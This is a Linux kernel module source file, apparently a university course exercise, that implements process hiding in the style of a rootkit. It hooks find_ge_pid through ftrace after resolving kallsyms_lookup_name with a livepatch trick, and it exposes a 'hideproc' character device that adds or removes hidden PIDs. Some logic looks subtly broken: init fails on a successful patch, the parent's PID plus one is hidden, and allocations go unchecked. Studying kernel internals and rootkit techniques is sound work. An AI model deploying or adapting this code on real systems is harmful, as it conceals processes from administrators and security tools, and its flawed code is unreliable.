#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/livepatch.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");
MODULE_INFO(livepatch, "Y");

enum RETURN_CODE { SUCCESS };
unsigned long kallsyms_lookup_name(const char *name);

static struct klp_func funcs[] = {{
                                      .old_name = "kallsyms_lookup_name",
                                      .new_func = kallsyms_lookup_name,
                                  },
                                  {}};

static struct klp_func failfuncs[] = {{
                                          .old_name = "___________________",
                                      },
                                      {}};

static struct klp_object objs[] = {{
                                       .funcs = funcs,
                                   },
                                   {
                                       .name = "kallsyms_failing_name",
                                       .funcs = failfuncs,
                                   },
                                   {}};

static struct klp_patch patch = {
    .mod = THIS_MODULE,
    .objs = objs,
};

unsigned long kallsyms_lookup_name(const char *name) {
  return ((unsigned long (*)(const char *))funcs->old_func)(name);
}

struct ftrace_hook {
  const char *name;
  void *func, *orig;
  unsigned long address;
  struct ftrace_ops ops;
};

static int hook_resolve_addr(struct ftrace_hook *hook) {
  hook->address = kallsyms_lookup_name(hook->name);
  if (!hook->address) {
    printk("unresolved symbol: %s\n", hook->name);
    return -ENOENT;
  }
  *((unsigned long *)hook->orig) = hook->address;
  return 0;
}

static void notrace hook_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                      struct ftrace_ops *ops,
                                      struct pt_regs *fregs) {
  struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
  if (!within_module(parent_ip, THIS_MODULE))
    fregs->ip = (unsigned long)hook->func;
}

static int hook_install(struct ftrace_hook *hook) {
  int err = hook_resolve_addr(hook);
  if (err)
    return err;

  hook->ops.func = hook_ftrace_thunk;
  hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE |
                    FTRACE_OPS_FL_IPMODIFY;

  err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
  if (err) {
    printk("ftrace_set_filter_ip() failed: %d\n", err);
    return err;
  }

  err = register_ftrace_function(&hook->ops);
  if (err) {
    printk("register_ftrace_function() failed: %d\n", err);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    return err;
  }
  return 0;
}

void hook_remove(struct ftrace_hook *hook) {
  int err = unregister_ftrace_function(&hook->ops);
  if (err)
    printk("unregister_ftrace_function() failed: %d\n", err);
  err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
  if (err)
    printk("ftrace_set_filter_ip() failed: %d\n", err);
}

typedef struct {
  pid_t id;
  struct list_head list_node;
} pid_node_t;

LIST_HEAD(hidden_proc);

typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
static find_ge_pid_func real_find_ge_pid;

static struct ftrace_hook hook;

static bool is_hidden_proc(pid_t pid) {
  pid_node_t *proc, *tmp_proc;
  list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
    if (proc->id == pid)
      return true;
  }
  return false;
}

static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns) {
  struct pid *pid = real_find_ge_pid(nr, ns);
  while (pid && is_hidden_proc(pid->numbers->nr))
    pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
  return pid;
}

static void init_hook(void) {
  real_find_ge_pid = (find_ge_pid_func)kallsyms_lookup_name("find_ge_pid");
  hook.name = "find_ge_pid";
  hook.func = hook_find_ge_pid;
  hook.orig = &real_find_ge_pid;
  hook_install(&hook);
}

static int hide_process(pid_t pid) {
  pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
  pid_node_t *procParent;
  struct task_struct *task_struct_child;
  struct task_struct *task_struct_parent;
  struct pid *realPID;

  proc->id = pid;
  list_add_tail(&proc->list_node, &hidden_proc);

  realPID = find_get_pid(pid);
  task_struct_child = get_pid_task(realPID, PIDTYPE_PID);
  if (task_struct_child != NULL) {
    procParent = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
    task_struct_parent = task_struct_child->real_parent;
    procParent->id = (pid_t)((int)task_struct_parent->pid + 1);
    printk(KERN_INFO "@ ppid: %d\n", (int)procParent->id);
    list_add_tail(&procParent->list_node, &hidden_proc);
  }

  return SUCCESS;
}

static int unhide_process(pid_t pid) {
  pid_node_t *proc, *tmp_proc;
  if (pid == 0) {
    list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
      list_del(&proc->list_node);
      kfree(proc);
    }
    return SUCCESS;
  }
  list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
    if (proc->id == pid) {
      list_del(&proc->list_node);
      kfree(proc);
    }
  }
  return SUCCESS;
}

#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)

static int device_open(struct inode *inode, struct file *file) {
  return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file) {
  return SUCCESS;
}

static ssize_t device_read(struct file *filep, char *buffer, size_t len,
                           loff_t *offset) {
  pid_node_t *proc, *tmp_proc;
  char message[MAX_MESSAGE_SIZE];
  if (*offset)
    return 0;

  list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
    memset(message, 0, MAX_MESSAGE_SIZE);
    sprintf(message, OUTPUT_BUFFER_FORMAT, proc->id);
    copy_to_user(buffer + *offset, message, strlen(message));
    *offset += strlen(message);
  }
  return *offset;
}
static int char_place(char *str, char c) {
  int len = strlen(str);
  int i;
  for (i = 0; i < len; i++) {
    if (str[i] == c)
      return i;
  }
  return -1;
}

static ssize_t device_write(struct file *filep, const char *buffer, size_t len,
                            loff_t *offset) {
  long pid;
  char *message;

  char add_message[] = "add", del_message[] = "del";
  if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
    return -EAGAIN;

  message = kmalloc(len + 1, GFP_KERNEL);
  memset(message, 0, len + 1);
  copy_from_user(message, buffer, len);
  printk(KERN_INFO "@ %s\n", message);
  if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
    char *goal;
    char *tmpCharPtr;
    goal = message + sizeof(add_message);
    while (1) {
      int dotPlace = char_place(goal, ',');
      if (dotPlace < 0) {
        kstrtol(goal, 10, &pid);
        hide_process(pid);
        printk(KERN_INFO "@ %lu\n", pid);
        break;
      }
      tmpCharPtr = kmalloc(dotPlace + 1, GFP_KERNEL);
      strncpy(tmpCharPtr, goal, dotPlace);
      kstrtol(tmpCharPtr, 10, &pid);
      hide_process(pid);
      printk(KERN_INFO "@ %lu\n", pid);
      kfree(tmpCharPtr);
      goal += (dotPlace + 1) * sizeof(char);
    }
  } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
    kstrtol(message + sizeof(del_message), 10, &pid);
    unhide_process(pid);
  } else {
    kfree(message);
    return -EAGAIN;
  }

  *offset = len;
  kfree(message);
  return len;
}

static struct cdev cdev;
static struct class *hideproc_class = NULL;
static dev_t *devPtr = NULL;
static int dev_major;

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"

static int _hideproc_init(void) {
  int err, r;
  dev_t dev;
  printk(KERN_INFO "@ %s\n", __func__);
  // 配置裝置所需空間
  err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
  devPtr = &dev;
  // 生成裝置編號
  dev_major = MAJOR(dev);
  // 創建編號類別
  hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);
  // 將字元裝置的裝置編號註冊進核心系統
  cdev_init(&cdev, &fops);
  cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);
  // 創建裝置所需文件
  device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                DEVICE_NAME);

  r = klp_enable_patch(&patch);

  if (!r)
    return -1;
  init_hook();

  return 0;
}

static void _hideproc_exit(void) {
  // 清空 hideProcess List, 已設定好設為0就是全清
  unhide_process(0);
  // 註銷 ftrace 的 hook ,包含設定回調函數以及設定綁定 address
  hook_remove(&hook);

  /* 釋放字元裝置*/
  // 刪除裝置文件
  device_destroy(hideproc_class, MKDEV(dev_major, MINOR_VERSION));
  // 註銷裝置號
  cdev_del(&cdev);
  // 刪除該裝置類別
  class_destroy(hideproc_class);
  // 釋放裝置空間
  unregister_chrdev_region(*devPtr, MINOR_VERSION);

  printk(KERN_INFO "@ %s\n", __func__);
  /* FIXME: ensure the release of all allocated resources */
}

module_init(_hideproc_init);
module_exit(_hideproc_exit);